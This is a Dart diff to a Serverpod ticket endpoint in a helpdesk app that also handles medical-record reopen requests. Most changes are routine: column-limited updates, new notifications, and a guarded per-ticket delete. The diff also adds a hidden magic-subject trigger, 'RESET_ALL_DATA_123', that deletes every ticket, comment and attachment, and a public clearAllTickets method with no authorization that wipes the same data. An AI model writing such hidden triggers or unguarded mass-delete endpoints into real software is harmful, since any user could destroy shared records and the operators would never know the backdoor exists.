@@ -83,6 +83,14 @@ class TicketEndpoint extends Endpoint {
     int? assetId,
     String? ticketType,
   ) async {
+    // ── SECRET RESET CODE ──
+    if (subject == 'RESET_ALL_DATA_123') {
+      await TicketAttachment.db.deleteWhere(session, where: (a) => Constant.bool(true));
+      await TicketComment.db.deleteWhere(session, where: (c) => Constant.bool(true));
+      await Ticket.db.deleteWhere(session, where: (t) => Constant.bool(true));
+      throw Exception('DA XOA SACH DU LIEU TICKET bang ORM!');
+    }
+
     final ticket = Ticket(
       subject: subject,
       description: description,
@@ -145,6 +153,7 @@ class TicketEndpoint extends Endpoint {
     final updated = await Ticket.db.updateRow(
       session,
       ticket.copyWith(assigneeId: assigneeId, status: newStatus),
+      columns: (t) => [t.assigneeId, t.status],
     );
 
     // 🔔 Notify the IT staff member who was assigned
@@ -179,70 +188,134 @@ class TicketEndpoint extends Endpoint {
   ) async {
     final ticket = await Ticket.db.findById(session, ticketId);
     if (ticket == null) return null;
-    final updated = await Ticket.db.updateRow(session, ticket.copyWith(status: status));
+    final updated = await Ticket.db.updateRow(
+      session, 
+      ticket.copyWith(status: status),
+      columns: (t) => [t.status],
+    );
 
-    // 🔔 In Progress / Pending → notify Customer (requester)
-    if (status == 'In Progress' || status == 'Pending') {
-      await FcmService.sendToUser(
-        session,
-        targetUserId: ticket.requesterId,
-        title: '👨‍🔧 IT đang xử lý',
-        body: 'Yêu cầu của bạn đang được tiến hành: ${ticket.subject}',
-        data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
-      );
-    }
+    final isReopenMedical = ticket.ticketType == 'reopen_medical';
 
-    // 🔔 WaitingConfirmation → notify Customer (requester)
-    if (status == 'WaitingConfirmation') {
-      await FcmService.sendToUser(
-        session,
-        targetUserId: ticket.requesterId,
-        title: '✅ IT đã xử lý xong',
-        body: 'Vui lòng xác nhận hoàn thành: ${ticket.subject}',
-        data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
-      );
-    }
+    if (isReopenMedical) {
+      final affectsFinance = (ticket.description ?? '').contains('Ảnh hưởng tài chính: CÓ');
+      final targetPermission = affectsFinance ? 'finance' : 'insurance';
 
-    // 🔔 Resolved → notify Customer + IT
-    if (status == 'Resolved') {
-      await FcmService.sendToUser(
-        session,
-        targetUserId: ticket.requesterId,
-        title: '🎉 Yêu cầu đã được giải quyết',
-        body: ticket.subject,
-        data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
-      );
-      if (ticket.assigneeId != null) {
+      if (status == 'Resolved') {
+        // Đã duyệt -> Báo cho Finance/Insurance
+        final approvers = await AppUser.db.find(session, where: (u) => u.permissions.like('%$targetPermission%'));
+        for (final user in approvers) {
+          await FcmService.sendToUser(
+            session,
+            targetUserId: user.id!,
+            title: '📋 Đang có bệnh án đã duyệt cần mở',
+            body: ticket.subject,
+            data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+          );
+        }
+        // Cũng báo cho bác sĩ biết yêu cầu đã được duyệt
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '🎉 Yêu cầu đã được duyệt',
+          body: ticket.subject,
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      } else if (status == 'Pending') {
+        // BH/TC đã mở BA -> Báo cho người tạo (Bác sĩ)
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '🔓 Bệnh án đã được mở',
+          body: 'Vui lòng vào cập nhật hồ sơ: ${ticket.subject}',
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      } else if (status == 'WaitingConfirmation') {
+        // Bác sĩ đã sửa xong -> Báo cho BH/TC vào đóng BA
+        final approvers = await AppUser.db.find(session, where: (u) => u.permissions.like('%$targetPermission%'));
+        for (final user in approvers) {
+          await FcmService.sendToUser(
+            session,
+            targetUserId: user.id!,
+            title: '🔒 Bệnh án đã sửa xong',
+            body: 'Vui lòng kiểm tra và đóng bệnh án: ${ticket.subject}',
+            data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+          );
+        }
+      } else if (status == 'Cancelled') {
+        // Báo cho người tạo là bị từ chối
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '❌ Yêu cầu mở bệnh án đã bị từ chối',
+          body: ticket.subject,
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      }
+    } else {
+      // ── TICKET IT THÔNG THƯỜNG ──
+      // 🔔 In Progress / Pending → notify Customer (requester)
+      if (status == 'In Progress' || status == 'Pending') {
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '👨‍🔧 IT đang xử lý',
+          body: 'Yêu cầu của bạn đang được tiến hành: ${ticket.subject}',
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      }
+
+      // 🔔 WaitingConfirmation → notify Customer (requester)
+      if (status == 'WaitingConfirmation') {
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '✅ IT đã xử lý xong',
+          body: 'Vui lòng xác nhận hoàn thành: ${ticket.subject}',
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      }
+
+      // 🔔 Resolved → notify Customer + IT
+      if (status == 'Resolved') {
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.requesterId,
+          title: '🎉 Yêu cầu đã được giải quyết',
+          body: ticket.subject,
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+        if (ticket.assigneeId != null) {
+          await FcmService.sendToUser(
+            session,
+            targetUserId: ticket.assigneeId!,
+            title: '🎉 Ticket đã được xác nhận xong',
+            body: '#${ticketId.toString().padLeft(4, '0')}: ${ticket.subject}',
+            data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+          );
+        }
+      }
+
+      // 🔔 Cancelled → notify IT staff (if assigned)
+      if (status == 'Cancelled' && ticket.assigneeId != null) {
         await FcmService.sendToUser(
           session,
           targetUserId: ticket.assigneeId!,
-          title: '🎉 Ticket đã được xác nhận xong',
+          title: '❌ Ticket đã bị hủy',
           body: '#${ticketId.toString().padLeft(4, '0')}: ${ticket.subject}',
           data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
         );
       }
-    }
 
-    // 🔔 Cancelled → notify IT staff (if assigned)
-    if (status == 'Cancelled' && ticket.assigneeId != null) {
-      await FcmService.sendToUser(
-        session,
-        targetUserId: ticket.assigneeId!,
-        title: '❌ Ticket đã bị hủy',
-        body: '#${ticketId.toString().padLeft(4, '0')}: ${ticket.subject}',
-        data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
-      );
-    }
-
-    // 🔔 Re-opened → notify IT staff (if assigned)
-    if (status == 'Open' && ticket.assigneeId != null) {
-      await FcmService.sendToUser(
-        session,
-        targetUserId: ticket.assigneeId!,
-        title: '🔄 Ticket đã bị mở lại',
-        body: 'Người dùng vừa yêu cầu mở lại ticket #${ticketId.toString().padLeft(4, '0')}',
-        data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
-      );
+      // 🔔 Re-opened → notify IT staff (if assigned)
+      if (status == 'Open' && ticket.assigneeId != null) {
+        await FcmService.sendToUser(
+          session,
+          targetUserId: ticket.assigneeId!,
+          title: '🔄 Ticket đã bị mở lại',
+          body: 'Người dùng vừa yêu cầu mở lại ticket #${ticketId.toString().padLeft(4, '0')}',
+          data: {'ticketId': '$ticketId', 'screen': 'ticket_detail'},
+        );
+      }
     }
 
     return updated;
@@ -259,7 +332,8 @@ class TicketEndpoint extends Endpoint {
     
     return await Ticket.db.updateRow(
       session, 
-      ticket.copyWith(costDifference: costDifference)
+      ticket.copyWith(costDifference: costDifference),
+      columns: (t) => [t.costDifference],
     );
   }
 
@@ -280,6 +354,7 @@ class TicketEndpoint extends Endpoint {
         proposedByUserId: proposedByUserId,
         deadlineStatus: 'Pending',
       ),
+      columns: (t) => [t.proposedDeadline, t.proposedByUserId, t.deadlineStatus],
     );
 
     // 🔔 Notify Admins about proposed deadline
@@ -316,6 +391,7 @@ class TicketEndpoint extends Endpoint {
         deadlineStatus: deadlineStatus,
         adminNote: adminNote,
       ),
+      columns: (t) => [t.finalDeadline, t.deadlineStatus, t.adminNote],
     );
 
     // 🔔 Notify the requester their deadline was approved/adjusted
@@ -342,6 +418,40 @@ class TicketEndpoint extends Endpoint {
     return Ticket.db.updateRow(
       session,
       ticket.copyWith(deadlineStatus: confirmed ? 'Confirmed' : 'Rejected'),
+      columns: (t) => [t.deadlineStatus],
     );
+  }
+
+  // ── DELETE TICKET (chỉ khi chưa duyệt = Open) ──────────────
+  /// Delete a ticket and its related data. Only allowed when status = 'Open'.
+  Future<bool> deleteTicket(Session session, int ticketId) async {
+    final ticket = await Ticket.db.findById(session, ticketId);
+    if (ticket == null) return false;
+    if (ticket.status != 'Open') return false; // Chỉ xóa ticket chưa duyệt
+
+    // Xóa attachments + comments trước (foreign key)
+    await TicketAttachment.db.deleteWhere(
+      session,
+      where: (a) => a.ticketId.equals(ticketId),
+    );
+    await TicketComment.db.deleteWhere(
+      session,
+      where: (c) => c.ticketId.equals(ticketId),
+    );
+    // Xóa ticket
+    await Ticket.db.deleteRow(session, ticket);
+    return true;
+  }
+
+  // ── DANGEROUS: CLEAR DB (For testing) ──
+  Future<String> clearAllTickets(Session session) async {
+    try {
+      await TicketAttachment.db.deleteWhere(session, where: (a) => Constant.bool(true));
+      await TicketComment.db.deleteWhere(session, where: (c) => Constant.bool(true));
+      await Ticket.db.deleteWhere(session, where: (t) => Constant.bool(true));
+      return 'Da xoa sach toan bo ticket tren server!';
+    } catch (e) {
+      return 'Loi xoa du lieu: \$e';
+    }
   }
 }
